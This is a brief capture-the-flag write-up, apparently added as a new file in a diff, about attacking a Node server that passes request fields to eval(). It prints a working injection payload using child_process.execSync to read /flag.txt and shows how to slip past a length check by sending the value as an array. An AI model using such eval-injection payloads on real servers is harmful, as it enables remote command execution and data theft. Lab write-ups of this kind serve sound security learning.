@@ -1,0 +1,22 @@
+This node server had an eval function taking width and height as input
+
+eval('(' + width + '**2 + ' + height + '**2) ** (1/2);' )
+
+the web interface would allow only numbers so we have to use requests module in python3
+
+i used a post request containing json as {
+    "width":"1);throw require(child_process).execSync('cat /flag.txt')//",
+    "height":1
+}
+
+the above width would evaluate to eval((1);throw rerequire(child_process).execSync('cat /flag.txt')//)rest is commented out
+but there was a length check width <10 so instead of passing it as a string i passed as an array
+
+"width":["1)....."]
+
+that way length of array is number of elements =======> which is 1
+so the code will execute and return a flag
+
+however note here that string + [string] = string ==========> otherwise it wouldnt have worked
+
+(the location of the flag i assumed)
